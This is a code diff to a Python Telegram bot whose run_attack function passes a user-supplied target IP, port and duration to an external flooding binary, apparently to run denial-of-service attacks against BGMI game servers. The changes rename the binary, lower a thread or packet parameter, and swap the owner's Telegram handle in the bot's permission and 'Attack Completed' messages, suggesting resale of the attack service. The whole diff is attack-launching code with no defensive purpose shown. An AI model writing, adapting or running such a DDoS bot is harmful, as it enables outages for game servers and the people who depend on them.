@@ -60,7 +60,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {time} 1500",
+            f"./rahul {ip} {port} {time} 800",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -76,7 +76,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     finally:
         attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed ✅*\n*🔥 Owner @RAJOWNER90*\n*🔥 SERVER BGMI*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed ✅*\n*🔥 Owner @rovin_vip\n*🔥 SERVER BGMI*", parse_mode='Markdown')
 
 async def attack(update: Update, context: CallbackContext):
     global attack_in_progress
@@ -86,7 +86,7 @@ async def attack(update: Update, context: CallbackContext):
     args = context.args
 
     if user_id not in users:
-        await context.bot.send_message(chat_id=chat_id, text="*🤡 𝐘𝐨𝐮 𝐍𝐞𝐞𝐝 𝐓𝐨 𝐆𝐞𝐭 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐨𝐧 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 » @RAJOWNER90*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🤡 𝐘𝐨𝐮 𝐍𝐞𝐞𝐝 𝐓𝐨 𝐆𝐞𝐭 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐨𝐧 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 » @rovin_vip", parse_mode='Markdown')
         return
 
     if attack_in_progress:
@@ -103,7 +103,7 @@ async def attack(update: Update, context: CallbackContext):
         f"*⭐ 𝗧𝗮𝗿𝗴𝗲𝘁 » {ip}*\n"
         f"*⭐ 𝗣𝗼𝗿𝘁 » {port}*\n"
         f"*⭐ 𝗧𝗶𝗺𝗲 » {time} seconds*\n"
-        f"*🔥 𝗢𝘄𝗻𝗲𝗿 @RAJOWNER90*\n"        
+        f"*🔥 𝗢𝘄𝗻𝗲𝗿 @rovin_vip\n"        
         f"*🔥 SERVER BGMI*"           
     ), parse_mode='Markdown')
 
